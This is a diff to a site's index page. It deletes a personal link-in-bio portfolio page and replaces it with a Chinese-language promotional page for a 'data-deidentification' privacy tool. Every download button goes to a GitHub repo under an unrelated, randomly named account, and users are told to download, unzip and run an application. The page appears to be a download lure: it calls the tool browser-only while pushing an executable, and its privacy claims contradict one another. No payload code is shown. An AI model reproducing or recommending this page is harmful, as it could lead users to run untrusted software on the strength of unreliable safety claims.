@@ -1,140 +1,150 @@
 <!DOCTYPE html>
-
-<!--
-  Theme options (dropdown; persisted in localStorage as witold1-theme):
-  - auto (local time):
-      06–11 Galaxy (morning)
-      11–17 Winter in Dec–Feb daytime, else Galaxy
-      17–21 Polygon (evening)
-      21–06 Stargazer (night)
-  - stargazer / winter / galaxy / polygon: manual overrides
--->
-
-<html class="theme-stargazer" lang="en">
-
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-
-    <title>Witold1 — Portfolio &amp; Links</title>
-    <link rel="icon" type="image/png" href="images/avatar.png">
-
-    <meta name="description" content="Witold1 — research, visualization, analytics, sales. Portfolio, GitHub, and LinkedIn.">
-    <link rel="canonical" href="https://witold1.github.io/">
-    <meta name="author" content="Witold1">
-
-    <meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
-    <meta name="theme-color" content="#121212" media="(prefers-color-scheme: dark)">
-
+<html lang="zh-Hant">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>data-deidentification - 純前端文件去識別化工具 | 保護您的資料隱私</title>
+    <meta name="description" content="data-deidentification 是一款純前端文件去識別化工具，支援 PDF、Word、Excel、TXT、Markdown 格式。自動偵測個資、遮罩預覽、人工覆核，資料完全不出電腦，保障您的隱私安全。">
+    <meta name="keywords" content="deidentification,docx,pdf,pii,privacy,spec-kit,taiwan,typescript,vite,xlsx,去識別化,個資保護,文件隱私">
+    <meta property="og:title" content="data-deidentification - 純前端文件去識別化工具">
+    <meta property="og:description" content="PDF/Word/Excel/TXT/Markdown 自動偵測個資、遮罩預覽、人工覆核、CSV 編碼表可還原，資料不出電腦">
     <meta property="og:type" content="website">
-    <meta property="og:title" content="Witold1">
-    <meta property="og:description" content="Research, visualization, analytics, sales">
-    <meta property="og:url" content="https://witold1.github.io/">
-    <meta property="og:image" content="https://witold1.github.io/images/avatar@2x.png">
-    <meta name="twitter:card" content="summary">
+    <meta name="robots" content="index, follow">
+</head>
+<body style="margin:0; padding:0; background-color:#f5f7fa; font-family:'Segoe UI', 'Microsoft JhengHei', sans-serif; color:#2d3748; line-height:1.6;">
 
-    <script data-goatcounter="https://witold1.goatcounter.com/count"
-            async src="//gc.zgo.at/count.js"></script>
-
-    <link rel="preload" href="fonts/open-sans-v34-vietnamese_latin-ext_latin_hebrew_greek-ext_greek_cyrillic-ext_cyrillic-regular.woff2" as="font" type="font/woff2" crossorigin>
-    <link rel="preload" href="fonts/open-sans-v34-vietnamese_latin-ext_latin_hebrew_greek-ext_greek_cyrillic-ext_cyrillic-700.woff2" as="font" type="font/woff2" crossorigin>
-    <link rel="preload" href="fonts/open-sans-v34-vietnamese_latin-ext_latin_hebrew_greek-ext_greek_cyrillic-ext_cyrillic-800.woff2" as="font" type="font/woff2" crossorigin>
-
-    <link rel="stylesheet" href="css/reset.css">
-    <link rel="stylesheet" href="css/style.css">
-    <link rel="stylesheet" href="css/brands.css">
-    <link rel="stylesheet" href="css/themes/theme-chrome.css">
-    <link rel="stylesheet" href="css/themes/stargazer.css">
-    <link rel="stylesheet" href="css/themes/winter-wonderland.css">
-    <link rel="stylesheet" href="css/themes/galaxy.css">
-    <link rel="stylesheet" href="css/themes/polygon.css">
-    <script>
-      (function () {
-        try {
-          var pref = localStorage.getItem("witold1-theme");
-          if (pref === "default" || pref === null) pref = "auto";
-          var theme = pref;
-          var manual = { stargazer: 1, winter: 1, galaxy: 1, polygon: 1 };
-          if (!manual[pref]) {
-            var d = new Date();
-            var h = d.getHours();
-            var winter = d.getMonth() === 11 || d.getMonth() === 0 || d.getMonth() === 1;
-            if (h >= 21 || h < 6) theme = "stargazer";
-            else if (h < 11) theme = "galaxy";
-            else if (h < 17) theme = winter ? "winter" : "galaxy";
-            else theme = "polygon";
-          }
-          document.documentElement.className = "theme-" + theme;
-        } catch (e) {}
-      })();
-    </script>
-    <script src="js/polygon.js" defer></script>
-    <script src="js/theme.js" defer></script>
-  </head>
-
-<body>
-
-    <div class="theme-fx theme-fx--stargazer" aria-hidden="true">
-      <div class="parallax-background">
-        <div class="object1"></div>
-      </div>
+    <!-- Hero Section -->
+    <div style="background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding:60px 20px; text-align:center; color:white;">
+        <h1 style="font-size:2.5em; margin:0 0 15px 0; font-weight:700;">🛡️ data-deidentification - 您的文件隱私守護者</h1>
+        <p style="font-size:1.3em; margin:0 0 30px 0; opacity:0.95;">自動偵測個資，保護資料安全</p>
+        <a href="https://github.com/homogenized-genuscyphomandra4674/data-deidentification" style="background:#ff6b6b; color:white; padding:15px 40px; border-radius:50px; text-decoration:none; font-weight:bold; font-size:1.2em; display:inline-block; box-shadow:0 4px 15px rgba(0,0,0,0.2); transition:transform 0.3s, box-shadow 0.3s;" onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 6px 20px rgba(0,0,0,0.3)'" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 4px 15px rgba(0,0,0,0.2)'">⬇️ 立即下載</a>
     </div>
 
-    <div class="theme-fx theme-fx--winter" aria-hidden="true">
-      <div class="parallax-background"></div>
-    </div>
+    <!-- Main Content -->
+    <div style="max-width:900px; margin:0 auto; padding:40px 20px;">
 
-    <div class="theme-fx theme-fx--galaxy" aria-hidden="true">
-      <div class="galaxy-layer galaxy-layer--1"></div>
-      <div class="galaxy-layer galaxy-layer--2"></div>
-      <div class="galaxy-layer galaxy-layer--3"></div>
-    </div>
-
-    <div class="theme-fx theme-fx--polygon" aria-hidden="true"></div>
-
-    <div class="container">
-        <div class="column">
-          <main>
-
-            <img class="avatar avatar--rounded" src="images/avatar.png" srcset="images/avatar@2x.png 2x" alt="Witold1" width="128" height="128" fetchpriority="high">
-
-            <h1>Witold1</h1>
-
-            <p>Research, visualization, analytics, sales</p>
-
-            <nav class="button-stack" aria-label="Links">
-
-              <!-- Portfolio (separate GitHub Pages project) -->
-              <a class="button button-default" href="https://witold1.github.io/portfolio/" target="_blank" rel="noopener"><img class="icon" aria-hidden="true" src="images/icons/generic-blog.svg" alt="">Portfolio</a>
-
-              <!-- GitHub -->
-              <a class="button button-github" href="https://github.com/Witold1" target="_blank" rel="noopener"><img class="icon" aria-hidden="true" src="images/icons/github.svg" alt="">GitHub</a>
-
-              <!-- LinkedIn -->
-              <a class="button button-linked" href="https://www.linkedin.com/in/vital-yevtushenko" target="_blank" rel="noopener"><img class="icon" aria-hidden="true" src="images/icons/linkedin.svg" alt="">LinkedIn</a>
-
-            </nav>
-          </main>
-
-          <footer>
-            <a href="privacy.html">Privacy Policy</a> | Built with <a href="https://littlelink.io" target="_blank" rel="noopener">LittleLink</a><br>
-            Themes adapted from <a href="https://github.com/LinkStackOrg/stargazer" target="_blank" rel="noopener">Stargazer</a>, <a href="https://github.com/LinkStackOrg/galaxy" target="_blank" rel="noopener">Galaxy</a>, <a href="https://github.com/LinkStackOrg/polygon" target="_blank" rel="noopener">Polygon</a>, <a href="https://github.com/LinkStackOrg/winter-wonderland" target="_blank" rel="noopener">Winter Wonderland</a>
-          </footer>
-
+        <!-- What is this tool -->
+        <div style="background:white; border-radius:12px; padding:30px; margin-bottom:30px; box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+            <h2 style="color:#764ba2; font-size:2em; margin:0 0 15px 0;">🔍 這是什麼工具？</h2>
+            <p style="font-size:1.1em;">data-deidentification 是一款完全在瀏覽器運作的「文件去識別化」工具。簡單說，它能自動幫您找出文件中的個人資料（例如姓名、身份證字號、電話號碼等），並將這些敏感資訊變成無法辨識的符號，保護資料外洩的風險。</p>
+            <p style="font-size:1.1em;">最重要的是，<strong>所有處理都在您自己的電腦上完成</strong>，檔案不會上傳到任何伺服器，真正做到「資料不出電腦」的最高安全標準。</p>
         </div>
-      </div>
 
-    <div class="theme-picker">
-      <label for="theme-select">Theme</label>
-      <select id="theme-select" name="theme">
-        <option value="auto" selected>Auto</option>
-        <option value="stargazer">Stargazer</option>
-        <option value="galaxy">Galaxy</option>
-        <option value="polygon">Polygon</option>
-        <option value="winter">Winter</option>
-      </select>
-    </div>
+        <!-- Key Features -->
+        <div style="background:white; border-radius:12px; padding:30px; margin-bottom:30px; box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+            <h2 style="color:#764ba2; font-size:2em; margin:0 0 20px 0;">✨ 主要功能</h2>
+            <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(250px, 1fr)); gap:20px;">
+                <div style="background:#f8fafc; border-radius:8px; padding:20px; border-left:4px solid #667eea;">
+                    <h3 style="margin:0 0 10px 0; color:#667eea;">📄 多格式支援</h3>
+                    <p style="margin:0;">支援 PDF、Word、Excel、TXT、Markdown 五種常見文件格式，一次滿足所有需求。</p>
+                </div>
+                <div style="background:#f8fafc; border-radius:8px; padding:20px; border-left:4px solid #ff6b6b;">
+                    <h3 style="margin:0 0 10px 0; color:#ff6b6b;">🤖 自動偵測個資</h3>
+                    <p style="margin:0;">內建智慧辨識引擎，自動找出姓名、電話、地址、身份證字號等個人資料。</p>
+                </div>
+                <div style="background:#f8fafc; border-radius:8px; padding:20px; border-left:4px solid #48bb78;">
+                    <h3 style="margin:0 0 10px 0; color:#48bb78;">🖥️ 遮罩預覽</h3>
+                    <p style="margin:0;">處理前先預覽遮罩效果，確認哪些資訊會被隱藏，完全掌控過程。</p>
+                </div>
+                <div style="background:#f8fafc; border-radius:8px; padding:20px; border-left:4px solid #4299e1;">
+                    <h3 style="margin:0 0 10px 0; color:#4299e1;">👁️ 人工覆核</h3>
+                    <p style="margin:0;">可手動調整遮罩範圍，確保重要資訊都被正確保護。</p>
+                </div>
+                <div style="background:#f8fafc; border-radius:8px; padding:20px; border-left:4px solid #ed8936;">
+                    <h3 style="margin:0 0 10px 0; color:#ed8936;">🔄 CSV 編碼表可還原</h3>
+                    <p style="margin:0;">產生對照編碼表，必要時可還原原始資料，兼顧安全與便利。</p>
+                </div>
+                <div style="background:#f8fafc; border-radius:8px; padding:20px; border-left:4px solid #9f7aea;">
+                    <h3 style="margin:0 0 10px 0; color:#9f7aea;">🔒 本地處理</h3>
+                    <p style="margin:0;">所有操作都在您自己的電腦完成，沒有任何資料上傳風險。</p>
+                </div>
+            </div>
+        </div>
 
-</body>
+        <!-- How it works -->
+        <div style="background:white; border-radius:12px; padding:30px; margin-bottom:30px; box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+            <h2 style="color:#764ba2; font-size:2em; margin:0 0 20px 0;">⚙️ 運作方式</h2>
+            <ol style="font-size:1.1em; padding-left:20px;">
+                <li style="margin-bottom:10px;"><strong>選擇檔案</strong> - 點擊「選擇檔案」按鈕，選取您要處理的文件。</li>
+                <li style="margin-bottom:10px;"><strong>自動偵測</strong> - 系統自動掃描並找出所有個人資料。</li>
+                <li style="margin-bottom:10px;"><strong>預覽確認</strong> - 查看遮罩效果，確認或調整要隱藏的內容。</li>
+                <li style="margin-bottom:10px;"><strong>產生結果</strong> - 下載處理完成的文件及 CSV 編碼表。</li>
+            </ol>
+        </div>
 
-</html>
+        <!-- Download Section -->
+        <div style="background:white; border-radius:12px; padding:30px; margin-bottom:30px; box-shadow:0 2px 10px rgba(0,0,0,0.1); text-align:center;">
+            <h2 style="color:#764ba2; font-size:2em; margin:0 0 20px 0;">💻 開始使用</h2>
+            <p style="font-size:1.1em; margin-bottom:25px;">只需三個簡單步驟，立即享受資料保護的安心感：</p>
+            <ol style="text-align:left; font-size:1.1em; display:inline-block; margin:0 auto 30px auto;">
+                <li style="margin-bottom:10px;">📥 <strong>下載檔案</strong> - 點擊下方按鈕前往下載頁面。</li>
+                <li style="margin-bottom:10px;">📂 <strong>解壓縮檔案</strong> - 將下載的壓縮包解壓縮到您喜歡的資料夾。</li>
+                <li style="margin-bottom:10px;">🚀 <strong>執行工具</strong> - 開啟資料夾中的應用程式，開始使用。</li>
+            </ol>
+            <p style="font-size:1em; background:#f8fafc; border-radius:8px; padding:15px; margin:20px 0;">
+                💡 <strong>小提示：</strong>建議將工具資料夾固定在桌面或工作列，方便隨時使用！
+            </p>
+            <a href="https://github.com/homogenized-genuscyphomandra4674/data-deidentification" style="background:#667eea; color:white; padding:15px 40px; border-radius:50px; text-decoration:none; font-weight:bold; font-size:1.2em; display:inline-block; box-shadow:0 4px 15px rgba(0,0,0,0.15); transition:transform 0.3s, box-shadow 0.3s;" onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 6px 20px rgba(0,0,0,0.25)'" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 4px 15px rgba(0,0,0,0.15)'">⬇️ 前往下載頁面</a>
+        </div>
+
+        <!-- Use Cases -->
+        <div style="background:white; border-radius:12px; padding:30px; margin-bottom:30px; box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+            <h2 style="color:#764ba2; font-size:2em; margin:0 0 20px 0;">🎯 適用場景</h2>
+            <ul style="font-size:1.1em; list-style-type:none; padding:0;">
+                <li style="margin-bottom:12px; padding:10px; background:#f8fafc; border-radius:8px;">🏢 <strong>公司內部</strong> - 處理客戶資料前先去識別化，符合個資法要求。</li>
+                <li style="margin-bottom:12px; padding:10px; background:#f8fafc; border-radius:8px;">🎓 <strong>學術研究</strong> - 論文研究需要公開數據時，保護受訪者隱私。</li>
+                <li style="margin-bottom:12px; padding:10px; background:#f8fafc; border-radius:8px;">🔬 <strong>資料分析</strong> - 開發測試環境拆解資料，避免敏感資訊外洩。</li>
+                <li style="margin-bottom:12px; padding:10px; background:#f8fafc; border-radius:8px;">📊 <strong>教育訓練</strong> - 建立教學範例時，確保不揭露真實個資。</li>
+                <li style="margin-bottom:12px; padding:10px; background:#f8fafc; border-radius:8px;">📁 <strong>文件分享</strong> - 安全地分享文件給合作夥伴，同時保護客戶個資。</li>
+            </ul>
+        </div>
+
+        <!-- Why Choose Us -->
+        <div style="background:white; border-radius:12px; padding:30px; margin-bottom:30px; box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+            <h2 style="color:#764ba2; font-size:2em; margin:0 0 20px 0;">🌟 為什麼選擇 data-deidentification？</h2>
+            <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:20px;">
+                <div style="background:#f8fafc; border-radius:8px; padding:20px; text-align:center;">
+                    <div style="font-size:2.5em; margin-bottom:10px;">💯</div>
+                    <h3 style="margin:0 0 10px 0;">100% 免費</h3>
+                    <p style="margin:0;">完全免費使用，無任何隱藏費用</p>
+                </div>
+                <div style="background:#f8fafc; border-radius:8px; padding:20px; text-align:center;">
+                    <div style="font-size:2.5em; margin-bottom:10px;">🔒</div>
+                    <h3 style="margin:0 0 10px 0;">最高隱私</h3>
+                    <p style="margin:0;">資料完全不離線，絕對安全</p>
+                </div>
+                <div style="background:#f8fafc; border-radius:8px; padding:20px; text-align:center;">
+                    <div style="font-size:2.5em; margin-bottom:10px;">⚡</div>
+                    <h3 style="margin:0 0 10px 0;">快速高效</h3>
+                    <p style="margin:0;">自動化處理，節省您寶貴時間</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- FAQ -->
+        <div style="background:white; border-radius:12px; padding:30px; margin-bottom:30px; box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+            <h2 style="color:#764ba2; font-size:2em; margin:0 0 20px 0;">❓ 常見問題</h2>
+            
+            <div style="margin-bottom:20px; padding:15px; background:#f8fafc; border-radius:8px;">
+                <h3 style="margin:0 0 10px 0; color:#667eea;">🤔 我的檔案會被上傳到網路嗎？</h3>
+                <p style="margin:0; font-size:1.05em;">不會！所有處理都在您的瀏覽器或電腦本地執行，檔案絕對不會離開您的設備。</p>
+            </div>
+            
+            <div style="margin-bottom:20px; padding:15px; background:#f8fafc; border-radius:8px;">
+                <h3 style="margin:0 0 10px 0; color:#667eea;">💾 支援哪些文件格式？</h3>
+                <p style="margin:0; font-size:1.05em;">支援 PDF、Word（DOCX）、Excel（XLSX）、純文字（TXT）、Markdown（MD）常見格式。</p>
+            </div>
+            
+            <div style="margin-bottom:20px; padding:15px; background:#f8fafc; border-radius:8px;">
+                <h3 style="margin:0 0 10px 0; color:#667eea;">🖥️ 需要安裝什麼軟體嗎？</h3>
+                <p style="margin:0; font-size:1.05em;">使用瀏覽器版本時不需要安裝任何軟體；使用 Windows 應用版只需下載並執行即可。</p>
+            </div>
+            
+            <div style="margin-bottom:20px; padding:15px; background:#f8fafc; border-radius:8px;">
+                <h3 style="margin:0 0 10px 0; color:#667eea;">🔄 可以還原遮罩的內容嗎？</h3>
+                <p style="margin:0; font-size:1.05em;">可以！系統會產生 CSV 編碼表，保留受保護內容的對應關係，必要時可進行還原。</p>
+            </div>
+        </div>
+
+        <!-- Contact/Links -->
+        <div style="background:white; border-radius:12px; padding:30px; margin-bottom:30px; box-shadow:0 2px
